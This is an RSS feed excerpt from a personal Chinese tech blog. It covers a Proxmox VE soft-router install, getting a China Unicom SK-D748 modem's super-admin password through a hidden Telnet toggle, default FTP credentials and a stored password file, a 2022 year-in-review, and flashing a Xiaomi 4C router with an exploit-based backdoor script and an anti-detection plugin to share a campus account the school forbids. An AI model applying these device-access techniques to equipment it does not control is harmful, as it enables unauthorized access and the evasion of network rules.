&lt;/h2&gt;&lt;p&gt;插上U盘，打开 Restful 写入镜像文件，设备选择U盘盘符，引导类型选择镜像文件，然后右边选择下载好的 PVE 镜像文件，其他的配置默认即可。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2023/02/03/63dcb88214c79.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;确认以后会有一个弹窗选择 DD 镜像模式写入。用个网上找的图片&lt;/p&gt;
&lt;p&gt;&lt;img src="https://qnam.smzdm.com/202202/24/62174f66812b27757.png_e1080.jpg"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;引导盘算制作好了。如果引导盘安装完成以后想要恢复成原来U盘，插上U盘，注意一下识别的盘符，引导类型选择为&lt;code&gt;非可引导&lt;/code&gt;重新格式化一下即可，文件系统 FAT32 不能写入超过 2G 大小的文件，所以我一般选 NTFS。&lt;/p&gt;
&lt;h2 id="虚拟机网段规划分配"&gt;虚拟机网段规划分配
&lt;/h2&gt;&lt;p&gt;因为安装的时候需要配置 PVE 网络的网关，既然用了软路由肯定是要用 OpenWrt、爱快这种路由系统装到虚拟机里，所以在安装之前先规划一下虚拟机的 IP 分配问题。以我安装的 OpenWrt 为例。&lt;/p&gt;
&lt;p&gt;我打算把软路由作为旁路由使用，不会影响家里爸妈用网体验，自己只需要本地改一下 WIFI 的网关为软路由地址即可。因为我家的入户路由所在的 IP 段是 192.168.1.0/24 ，所以我选择一个其他的网段如 192.168.5.0/24，避免和主路由所在的网段搞混。选择 PVE 系统的 IP 为 192.168.5.2，OpenWrt 虚拟机的 IP 为 192.168.5.3，其他虚拟机顺延。所以在安装 PVE 系统的时候网关需要填为 OpenWrt 准备的虚拟机地址 192.168.5.3，PVE 地址也需要修改为对应的。&lt;/p&gt;
&lt;p&gt;所以最后的结果就是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;PVE 主系统：192.168.5.2&lt;/p&gt;
&lt;p&gt;OpenWrt：192.168.5.3&lt;/p&gt;
&lt;p&gt;Xbantu：192.168.5.4&lt;/p&gt;
&lt;p&gt;&amp;hellip;&amp;hellip;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;如果是直接作为主路由拨号使用，网关同样要填上 OpenWrt 的地址，因为要用 OpenWrt 拨号。&lt;/p&gt;
&lt;h2 id="安装-pve-系统"&gt;安装 PVE 系统
&lt;/h2&gt;&lt;p&gt;U盘插上软路由，注意一下启动界面提示的进入 BIOS 界面的按键，我的是 F7，如果不一样问客服或者搜一搜。选择U盘作为引导盘启动安装系统，找一下自己的U盘名称。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2023/02/03/63dcbc8286845.png"
loading="lazy"
alt="1675410562364.png"
&gt;&lt;/p&gt;
&lt;p&gt;接下来进入PVE的安装界面。我已经装好系统了没图，可以看着上面推荐的视频里来，界面依次是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;选择默认的硬盘。&lt;/li&gt;
&lt;li&gt;输入国家、时区、键盘语言。&lt;/li&gt;
&lt;li&gt;设置管理员的密码、确认密码，设置邮箱。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这个邮箱我暂时还没有用到，可能 PVE 官方远程管理用得上，先填一个能使用的吧。&lt;/p&gt;
&lt;ol start="4"&gt;
&lt;li&gt;设置管理网卡口、域名、虚拟机 IP 段、网关、DNS。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;网卡&lt;/strong&gt;的选择是用于管理 PVE 虚拟机的网卡。比如我的软路由有四个物理网卡，我选择其中一个物理插上网线用来管理 PVE 及其虚拟机，其他三个物理网卡分配给其他虚拟机使用，通常是不可以直接访问 PVE 管理面板的。下拉列表有网卡真实的 MAC 地址，看最后两位一般是有顺序的，我也是大致对应软路由上的物理网口，&lt;del&gt;应该是从小到大吧&lt;/del&gt;，我选择了第四个最后一个网口最为 PVE 的管理网口。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;域名&lt;/strong&gt;可能和 PVE 官方的远程管理有关。虚拟机 &lt;strong&gt;IP 段&lt;/strong&gt;就是 PVE 管理的虚拟机可获得的 IP 范围。&lt;strong&gt;DNS&lt;/strong&gt; 不多说了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;网关&lt;/strong&gt;的设置，在&lt;a class="link" href="###%e8%99%9a%e6%8b%9f%e6%9c%ba%e7%bd%91%e6%ae%b5%e8%a7%84%e5%88%92%e5%88%86%e9%85%8d" &gt;虚拟机网段规划分配&lt;/a&gt;章节中有说明，填上。&lt;/p&gt;
&lt;ol start="5"&gt;
&lt;li&gt;确认填写信息&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;确认安装后稍等一段时间，PVE 会自动重启，系统选择 &lt;strong&gt;Proxmox VE GUN/Linux&lt;/strong&gt;，之后会进入 PVE 系统的登陆页面。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2023/02/07/63e1ab32bee01.png"
loading="lazy"
alt="1675733810414.png"
&gt;&lt;/p&gt;
&lt;p&gt;登陆的用户名是 &lt;strong&gt;root&lt;/strong&gt;，密码是刚刚安装时填写的密码。上面的信息是 PVE 的 Web 控制台地址，图中的地址可能和我的不一样，这个和前面设置的 IP 段有关。&lt;/p&gt;
&lt;h3 id="连接-pve-主机"&gt;连接 PVE 主机
&lt;/h3&gt;&lt;p&gt;安装完成以后，使用网线连接软路由，并配置自己电脑的有线网卡保证和软路由在同一个网段。比如我前面规划我的 IP 网段为 192.168.5.0/24，电脑随便填一个不会冲突的 IP，网关和 DNS 可以填为 OpenWrt 预留的地址。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2023/02/07/63e1a9ce293c3.png"
loading="lazy"
alt="1675733453093.png"
&gt;&lt;/p&gt;
&lt;p&gt;之后可以直接访问安装成功时提示的 PVE Web 控制台地址和端口，即使没有证书也要使用 &lt;strong&gt;https&lt;/strong&gt; 访问，浏览器高级选项中有继续访问。用户名是 &lt;strong&gt;root&lt;/strong&gt; 密码就是安装时填写的。下面可以选择语言为简体中文。可能会有一个其他提示直接跳过即可。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2023/02/07/63e1ae4e965f6.png"
loading="lazy"
alt="1675734606058.png"
&gt;&lt;/p&gt;
&lt;h2 id="一些配置"&gt;一些配置
&lt;/h2&gt;&lt;p&gt;为了方便一些虚拟机可以直通硬件设备，比如 NAS 直通硬盘，提高工作效率，所以需要对 PVE 设置并开启硬件直通。&lt;/p&gt;
&lt;p&gt;前面步骤连上软路由，使用 Shell 连接 PVE 系统，以上面为例地址为 192.168.5.2，用户名密码同上面。虚拟的相关技术不太懂，本人也是跟着操作的。&lt;/p&gt;
&lt;p&gt;偶然发现一篇文章讲了一些相关内容，内核大佬请看 &lt;a class="link" href="https://blog.csdn.net/coolfishbone_joey/article/details/124411847" target="_blank" rel="noopener"
&gt;[转]关于Linux grub配置iommu=pt intel_iommu=on&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="pve直通特性功能"&gt;PVE直通特性功能
&lt;/h3&gt;&lt;p&gt;注意 Intel 和 AMD 的CPU 一些参数不一样，我使用的 J4125 是 Intel 的。修改的文件都是 &lt;code&gt;/etc/default/grub&lt;/code&gt; ，需要修改的参数是 &lt;code&gt;GRUB_CMDLINE_LINUX_DEFAULT&lt;/code&gt;，默认值应该是&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;GRUB_CMDLINE_LINUX_DEFAULT=&amp;#34;quiet&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;根据 CPU 不同需要修改成&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Intel CPU&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;GRUB_CMDLINE_LINUX_DEFAULT=&amp;#34;quiet intel_iommu=on iommu=pt&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;AMD CPU&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;GRUB_CMDLINE_LINUX_DEFAULT=&amp;#34;quiet amd_iommu=on iommu=pt&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意参数之间的空格，修改之后保存退出，执行指令 &lt;code&gt;update-grub&lt;/code&gt; 更新一下引导程序，出现 &lt;strong&gt;done&lt;/strong&gt;字样就算成功。&lt;/p&gt;
&lt;h3 id="增加模块"&gt;增加模块
&lt;/h3&gt;&lt;p&gt;接下来增加一些模块，修改 &lt;code&gt;/etc/modules&lt;/code&gt;文件，添加#号下面的几个模块。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;# /etc/modules: kernel modules to load at boot time.
#
# This file contains the names of kernel modules that should be loaded
# at boot time, one per line. Lines beginning with &amp;#34;#&amp;#34; are ignored.
vfio
vfio_iommu_type1
vfio_pci
vfio_virqfd
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后执行指令 &lt;code&gt;update-initramfs -u -k all&lt;/code&gt; 对模块的升级。没有出现 &lt;strong&gt;Error&lt;/strong&gt; 字样就算成功了，之后 &lt;strong&gt;reboot&lt;/strong&gt; 重启一下。&lt;/p&gt;
&lt;h2 id="结束"&gt;结束
&lt;/h2&gt;&lt;p&gt;这一篇就先写到 PVE 的安装和配置直通，下一篇打算写自己经历的固件的选择和安装。软路由老早就装好了，当时也没截图凭借一些其他的教程写了自己的经过，自己挖的坑一定要填上！&lt;/p&gt;</description></item><item><title>中国联通SK-D748光猫超级密码获取</title><link>https://www.braindance.top/posts/play_time/%E4%B8%AD%E5%9B%BD%E8%81%94%E9%80%9Ask-d748%E5%85%89%E7%8C%AB%E8%B6%85%E7%BA%A7%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/</link><pubDate>Wed, 04 Jan 2023 00:00:00 +0000</pubDate><guid>https://www.braindance.top/posts/play_time/%E4%B8%AD%E5%9B%BD%E8%81%94%E9%80%9Ask-d748%E5%85%89%E7%8C%AB%E8%B6%85%E7%BA%A7%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/</guid><description>&lt;p&gt;折腾软路由百忙之中抽时间来简单&lt;del&gt;水&lt;/del&gt;一篇。&lt;/p&gt;
&lt;p&gt;有这个需求是因为目前在家里是用另一个无线路由器桥接联通的光猫的，但是在dhcp 里死活找不到桥接路由器分配的 ip，然后插上软路由竟然又把 ip 分配给软路由了，真是不服不行。&lt;/p&gt;
&lt;p&gt;之前装联通宽带的时候尝试过找师傅要超级管理员的密码，但是师傅给我打哈哈糊弄过去了，给的一个普通 user 用户并没有静态 ip 的权限，所以就去网上找教程了，自己记录一下。&lt;/p&gt;
&lt;p&gt;原文地址：&lt;a class="link" href="https://www.right.com.cn/forum/thread-8253868-1-1.html" target="_blank" rel="noopener"
&gt;https://www.right.com.cn/forum/thread-8253868-1-1.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;设备型号 SK-D748-C&lt;/p&gt;
&lt;h2 id="第一步"&gt;第一步
&lt;/h2&gt;&lt;p&gt;保证可以局域网内正常访问联通光猫的管理界面。比如我的光猫地址为 192.168.1.1&lt;/p&gt;
&lt;h2 id="第二步"&gt;第二步
&lt;/h2&gt;&lt;p&gt;打开隐藏配置界面：&lt;a class="link" href="http://192.168.1.1/hidden_version_switch.html" target="_blank" rel="noopener"
&gt;http://192.168.1.1/hidden_version_switch.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2023/01/04/63b53083b2580.png"
loading="lazy"
alt="1672818822972.png"
&gt;&lt;/p&gt;
&lt;p&gt;勾选图中的 Telnet Enable 选项，网页会刷新一下，接下来测试一下光猫的 telent 是否成功打开。&lt;/p&gt;
&lt;p&gt;开始 - 运行 - cmd，运行 &lt;code&gt;telnet 192.168.1.1&lt;/code&gt; 提示输入登陆用户名称视为成功。&lt;/p&gt;
&lt;h2 id="第三步"&gt;第三步
&lt;/h2&gt;&lt;p&gt;使用 ftp 连接光猫，默认的账号密码是 &lt;code&gt;useradmin/useradmin&lt;/code&gt; ，在 &lt;code&gt;/var/tmp&lt;/code&gt; 目录下的 &lt;code&gt;telnet_su_passwd&lt;/code&gt; 文件就是管理员密码。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2023/01/04/63b533f299fab.png"
loading="lazy"
alt="1672819703315.png"
&gt;&lt;/p&gt;
&lt;p&gt;我最后获得的密码格式是：前半段是光猫默认的 wifi 密码，从 CUAdmin 开始到后面一串数字是超级管理员的登陆密码&lt;/p&gt;
&lt;p&gt;超级管理员用户名是 CUAdmin&lt;/p&gt;
&lt;h2 id="其他说明"&gt;其他说明
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;不要尝试在 ftp 里随意删除软件，可能导致设备异常&lt;/li&gt;
&lt;li&gt;获取超级管理员权限后，修改任何设置前自行评估有无风险。&lt;/li&gt;
&lt;/ul&gt;</description></item><item><title>2022年度总结</title><link>https://www.braindance.top/posts/annual/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</link><pubDate>Sat, 31 Dec 2022 00:00:00 +0000</pubDate><guid>https://www.braindance.top/posts/annual/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</guid><description>&lt;p&gt;今年过得可真是太快了，不知道从哪开始写。前几天不小心点开微博，首页一句话想想只能苦笑一下，所有人应该都过得差不多吧。今年我乱过的，明年我一定好好过。&lt;/p&gt;
&lt;h2 id="学业"&gt;学业
&lt;/h2&gt;&lt;p&gt;可能到现在也不知道当时为了什么考研，可能就是觉得听了大环境下找工作不容易，自己觉得在本科学校体验不太好，想上个像样的大学，考前一阵子还记得说过：XXX（自己学校）狗都不来，现在调剂回本校了，到考前一天所有的书可能连一遍都没过完，数学只能说本科那几门都没整明白。本来目标也没多高，到调剂的时候一降再降，算了，有学上就行不挑了。&lt;/p&gt;
&lt;p&gt;现在只要是个计算机专业研究生基本上都逃不过人工智能的大门，无论是什么方向都会往上面靠，可能这就是大势所趋吧，我反正只能提起半个兴趣，也许我对所有东西都只能提起半个兴趣。人工智能又是和数学挺有关联的，自己考研数学都没整好，现在学的一门人工智能数学真的是边看边摇头。出来混迟早要还的。&lt;/p&gt;
&lt;p&gt;然后学校的培养计划是学硕专硕都要发文章，本来自己的表达能力都不太行，又想了想自己本科的毕业设计论文，既来之则安之吧。&lt;/p&gt;
&lt;h2 id="新冠疫情"&gt;新冠疫情
&lt;/h2&gt;&lt;p&gt;好像就是今年年初的时候开开始全员核酸，然后大四最后在学校基本上过两天就要下去排个队，然后学校组织的又不行，基本上一下去就要一个半小时在那站着，所以我基本上都是踩着尾去的。今年过得如此的快跟这个全员核酸和封闭逃不了干系，天天坐在屋子里面，一晃一天过去了，天天就跟乌龟一样都没动过，自己也没怎么运动过。&lt;/p&gt;
&lt;p&gt;然后年底阵子封控放开了，家里亲戚和认识的人基本都阳了个遍，我在家发烧了两波，刚好还都是在线上考试之后，有一晚上真是烧的顶不住了，半夜起来手机放旁边听歌还觉得好受了点，写这篇总结的时候已经差不多完全好了。就这样吧，反正也放开了，以后说不定就再也没有新冠疫情导致各种封闭了，在后头的好日子应该快来了吧啊？&lt;/p&gt;
&lt;h2 id="家人"&gt;家人
&lt;/h2&gt;&lt;p&gt;之前还会担心爸妈会在我不在家的时候家里闹矛盾什么的，现在感觉爸妈快退休了还是心态变了，现在俩人也会吵就是很快就笑了，这样子我在学校的时候也不会太担心了，总之确实跟之前也有很大的变化，希望身体都健健康康的就好。&lt;/p&gt;
&lt;p&gt;我姐年底的时候出国读博了，就如我姐之前说的她是真的惨，从幼儿园开始连着上了 30 年学，不过这应该也就是最后了，以她的专业，只要能顺利毕业接下来真就是好日子了。&lt;/p&gt;
&lt;h2 id="毕业"&gt;毕业
&lt;/h2&gt;&lt;p&gt;现在想想有点怀念本科最后做毕设那会，事也不算多，和其他的好几个宿舍天天都有联动活动，有点想起来小时候跟发小在外面疯一样，那种感觉真的是久违了。宿舍里两个去工作了，剩下三个考研只有我姑且算是考上了，但是我感觉他们每一个都比我努力的多，今年也都二战了，在这里祝他们都成功上岸吧，以后各自也都有自己的路要走了，这一次分别谁知道一下次会在哪见面，各位天山路远，山高水长，后会有期，江湖再见。&lt;/p&gt;
&lt;h2 id="感情"&gt;感情
&lt;/h2&gt;&lt;p&gt;算是失败过一次吧，但是也不算，反正现在性格小开阔一下，至少不像之前那样跟没见过女人一样 (😎👉😭🕶️) 年纪也快到了，爸妈开始正式跟我说这个问题了，之前从来都是闭口不谈，还声称我谈恋爱给我恋爱经费，但是我一个臭打游戏的，买个游戏都要蹲打折才行，这一点也得改一改。然后就是确实有点不懂人情世故，我要是女的我都觉得这个人看起来不太聪明有点妈宝的感觉。以后一个一个改吧，不然真就是相亲硬过日子了，感觉自己也是条件不咋地要求还挺高，到现在也没遇到真能豁出去的，自己也要胆大一些。&lt;/p&gt;
&lt;h2 id="自己的想法"&gt;自己的想法
&lt;/h2&gt;&lt;p&gt;昨天晚上高中同学回来了，一起遛弯聊了聊，他对他现在的工作挺不满意的想换了，想了下我再过两年就也该找工作了，但是天天只顾得上自己学和玩，除了程序员这一条路，其他能干啥也不知道，等到时候年纪大了被顶掉了咋办？确实想太多也会让步伐变慢，带着这个问题等遇到新信息再想吧。我也又一次确认了一下自己努力的目标就是为了到将来的时候能过得轻松点就很满足了。&lt;/p&gt;
&lt;p&gt;最近几个月买了个软路由，还应验了之前一篇文章里写的，过年别人在出去吃喝，我在家里折腾黑盒子，问我收获了什么，就是组了一个 all in one 看视频不要广告 blablabla，自己随地就可以魔法，父母只是沉默不语，看着自己家的电表转的又快了。哈哈哈&lt;/p&gt;
&lt;p&gt;自从从去年7 8月份加入了实验室吧，我就每天把自己安排的满满当当，从早上到晚上每一件事都用尽全力，不管是打游戏还是去学习和折腾些技术，感觉一点其他的时间都没有给自己留，一直都是火力全开往前走也没有停下来好好想一想，前几天在电视上也看到了一个广告，一个老奶奶教自己孙女画画说道：“画画要留白，人生也一样，不要把生活填得太满，多给自己留些空间”。也觉得这样排的满满当当自己有点吃不消了，而且好多东西也有点力不从心，开始变得有些木讷了，明年就先学学会劳逸结合，但是效率还是不能丢。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;现在是 22年12月31日23点25分，赶在这一年的最后把总结写出来了，就这样吧，今年确实过得听梦幻的，最近这三年都听梦幻的，翻了一遍相册也是没有什么大事可回忆的，平平淡淡也挺好的吧。&lt;/p&gt;
&lt;p&gt;再见 2022 ！&lt;/p&gt;</description></item><item><title>ZUT 使用路由器连接校园网</title><link>https://www.braindance.top/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/</link><pubDate>Tue, 11 Oct 2022 00:00:00 +0000</pubDate><guid>https://www.braindance.top/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/</guid><description>&lt;h2 id="前言"&gt;前言
&lt;/h2&gt;&lt;p&gt;我们学校的校园网不光每个月要宽带费 20/月，而且要绑定一个校园卡，我的一个月月租下来要 49/月，而且校园网还限制设备数量只能连接一个，我一般都是电脑连校园网，手机用流量，但是教职工的校园网就可以两个设备连接，寝室里目前有6+个设备也需要联网，商量以后打算搞个路由器贡献一个账号连校园网开 wifi，之前就见贴吧有老哥已经成功了，所以自己也尝试一下做个记录，给以后的同学看也不错。由于我已经连好路由器了，所以部分图片取自网络图片作为参考，我也尽量说的详细些。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;对于任何硬件、软件的损坏，本人没有赔偿的责任，哪怕这样的后果是因教程中的错误造成的。也请认真对待每一步操作，也许因为你的操作不当硬件因此变成一块砖。另外本教程的操作会使你的路由器失去保修。&lt;/li&gt;
&lt;li&gt;本篇文章仅起指导性的作用，在操作的过程中遇到的问题也许我也没有遇到过，请先自行尝试解决，如果我有空也会尽量帮助。&lt;/li&gt;
&lt;li&gt;学校明令禁止安装路由器，本人绝对没有怂恿或建议任何同学安装路由器，本人安装路由器的行为完全属于个人意志，仅仅作为个人的学习技术交流，请读者在安装好路由器之后 24 小时内再将之拆除，请按照学校指明的方式连接到互联网。如果学校根据校规等文件追究责任，与本人无关。&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;p&gt;叠甲过&lt;/p&gt;
&lt;h2 id="前置知识"&gt;前置知识
&lt;/h2&gt;&lt;p&gt;校园网插入网线认证是要模拟 Dr.com 软件的发包认证，除了账号密码认证校园网以外，软件还会定时发送心跳包保证校园网连接。&lt;/p&gt;
&lt;p&gt;zut 的校园网认证格式为账号：&lt;code&gt;\r\n你的学号@[unicom|telecom|cmcc]&lt;/code&gt; ，其中 &lt;code&gt;@&lt;/code&gt; 后面的是你的运营商，对照前面的格式分别为：联通、电信、移动，例如我的是联通校园网，账号就是：&lt;code&gt;\r\n2022********@unicom&lt;/code&gt;，密码就是你自己的密码。&lt;/p&gt;
&lt;p&gt;zut 校园网的客户端版本为：6.0.0（P）&lt;/p&gt;
&lt;p&gt;校园网的防检测插件原理还没有写，自己用的 小米4C 是社区固件资源中自带的。想看原理可以看最后挖坑部分&lt;/p&gt;
&lt;h2 id="需要的材料"&gt;需要的材料
&lt;/h2&gt;&lt;p&gt;本教程使用的路由器型号 &lt;code&gt;Xiaomi router 4c&lt;/code&gt; pdd二手35，安装的系统 &lt;code&gt;openwrt&lt;/code&gt;。&lt;strong&gt;请注意&lt;/strong&gt;：路由器的选择直接影响到你后面的操作，我专门在网上挑了好久选的这个路由器，但是，&lt;strong&gt;唯独这个路由器的社区资源最特殊&lt;/strong&gt;，本人也是经过各种尝试才成功。如果选择其他路由器，本教程中的主要安装思路相同，但是需要自行寻找适合自己路由器的固件资源。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;路由器。&lt;/li&gt;
&lt;li&gt;网线两根。一根我买的8m的，因为宿舍AP在门上面，另一根需要连接路由器和电脑，长度自己看。&lt;/li&gt;
&lt;li&gt;开通校园网的账号。&lt;/li&gt;
&lt;li&gt;自己思考的能力。&lt;/li&gt;
&lt;li&gt;需要的软件压缩包：&lt;a class="link" href="https://wwn.lanzouy.com/igsaW0dn0k3a" target="_blank" rel="noopener"
&gt;zut_Xiaomi_router_4c.zip&lt;/a&gt;。其中包含
&lt;ul&gt;
&lt;li&gt;dogcom.zip。用来进行校园网模拟拨号，定时发送心跳包的工具。&lt;/li&gt;
&lt;li&gt;R3GV2 patches.zip。刷机的主要部分包含了：R3GV2 patches（前期连接路由器的工具）、Mi4C.bin（小米 4c 的 openwrt 固件自带防检测插件）、breed.bin（breed web 恢复控制台）&lt;/li&gt;
&lt;li&gt;MobaXterm_Portable.zip。用来连接路由器和传输文件的软件&lt;/li&gt;
&lt;li&gt;小米路由器4C恢复官方固件工具包.zip。刷成砖的&lt;a class="link" href="https://web.vip.miui.com/page/info/mio/mio/detail?postId=19134127&amp;amp;app_version=dev.20051" target="_blank" rel="noopener"
&gt;官方补救措施&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="教程参考的网站或资料"&gt;教程参考的网站或资料
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;贴吧老哥的教程：&lt;a class="link" href="https://tieba.baidu.com/p/7760362347" target="_blank" rel="noopener"
&gt;https://tieba.baidu.com/p/7760362347&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;广东工业大学在 github 上的教程：&lt;a class="link" href="https://github.com/shengqiangzhang/Drcom-GDUT-HC5661A-OpenWrt" target="_blank" rel="noopener"
&gt;https://github.com/shengqiangzhang/Drcom-GDUT-HC5661A-OpenWrt&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;【记录】小米路由器 4C 刷机过程：&lt;a class="link" href="https://github.com/shengqiangzhang/Drcom-GDUT-HC5661A-OpenWrt/issues/27" target="_blank" rel="noopener"
&gt;https://github.com/shengqiangzhang/Drcom-GDUT-HC5661A-OpenWrt/issues/27&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;R4CM，说说我的小米路由器4C刷机过程：不用Linux也不用虚拟机…… ：&lt;a class="link" href="https://www.right.com.cn/FORUM/thread-4047571-1-1.html" target="_blank" rel="noopener"
&gt;https://www.right.com.cn/FORUM/thread-4047571-1-1.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;路由器认证校园网drcom：&lt;a class="link" href="https://www.brothereye.cn/router/669/" target="_blank" rel="noopener"
&gt;https://www.brothereye.cn/router/669/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="开工"&gt;开工
&lt;/h2&gt;&lt;p&gt;接通路由器电源，&lt;strong&gt;使用网线连接路由器&lt;/strong&gt;，进入初始化管理页面通常是 &lt;code&gt;192.168.1.1&lt;/code&gt;，能跳过就跳过，下图右选择无需拨号即可。（网络图片仅供参考）&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/article/2022/10/11/63450a2f460ac.png"
loading="lazy"
alt="ab3pm-21hcz.png"
&gt;&lt;/p&gt;
&lt;p&gt;接下来设置 wifi 名称和密码，可以勾选管理密码和 wifi 密码相同的框，保存以后会提示新的管理后台地址，通常是 &lt;code&gt;192.168.31.1&lt;/code&gt;，使用管理密码登陆以后，显示路由器界面就算初始化成功。&lt;/p&gt;
&lt;h2 id="刷入不死-breed"&gt;刷入不死 Breed
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Breed 是国内个人 hackpascal 开发的闭源 Bootloader（引导加载器，即为用于加载操作系统的程序），也被称为“不死鸟”。
因为有些官方升级固件自带 bootloader，如果从官方固件升级，会导致现有 bootloader 被覆盖。而当 Breed 更新固件时，它会自动删除固件附带的引导加载程序，因此可以防止 Breed 被覆盖。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;刷入 Breed 的作用就是为后面刷固件做个保险，失败以后可以进行 reset 复位，防止路由器刷成一块砖。&lt;/p&gt;
&lt;h3 id="开启路由器-telnet-和-ftp"&gt;开启路由器 telnet 和 ftp
&lt;/h3&gt;&lt;p&gt;打开前面下载的压缩包中的 &lt;code&gt;R3GV2 patches&lt;/code&gt; 文件夹，运行其中的 &lt;code&gt;0.start_main.bat&lt;/code&gt;，这个批处理的命令主要是运行了文件夹中的 &lt;code&gt;main.py&lt;/code&gt; ，而 &lt;code&gt;main.py&lt;/code&gt; 做的事情就是尝试发现你的路由器后台地址，然后需要输入&lt;strong&gt;管理后台的密码&lt;/strong&gt;，然后执行一些 exploit 在路由器中写入后门，界面中出现 &lt;code&gt;Done&lt;/code&gt; 字样就算成功。&lt;/p&gt;
&lt;p&gt;这里遇到过扫描不到管理后台的情况，如果遇到了可以参考以下步骤。修改 &lt;code&gt;main.py&lt;/code&gt; 文件中的第 10 行到 15 行，删掉&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;line4 &lt;span style="color:#f92672"&gt;=&lt;/span&gt; subprocess&lt;span style="color:#f92672"&gt;.&lt;/span&gt;check_output([&lt;span style="color:#e6db74"&gt;&amp;#34;cmd&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;/c&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;chcp&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;437&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;&amp;amp;&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;tracert&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;-d&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;-h&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;1&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;1.1.1.1&amp;#34;&lt;/span&gt;])&lt;span style="color:#f92672"&gt;.&lt;/span&gt;decode()&lt;span style="color:#f92672"&gt;.&lt;/span&gt;split(&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\r\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;)[&lt;span style="color:#ae81ff"&gt;4&lt;/span&gt;]&lt;span style="color:#f92672"&gt;.&lt;/span&gt;strip()&lt;span style="color:#f92672"&gt;.&lt;/span&gt;split(&lt;span style="color:#e6db74"&gt;&amp;#34; &amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; data &lt;span style="color:#f92672"&gt;in&lt;/span&gt; line4:
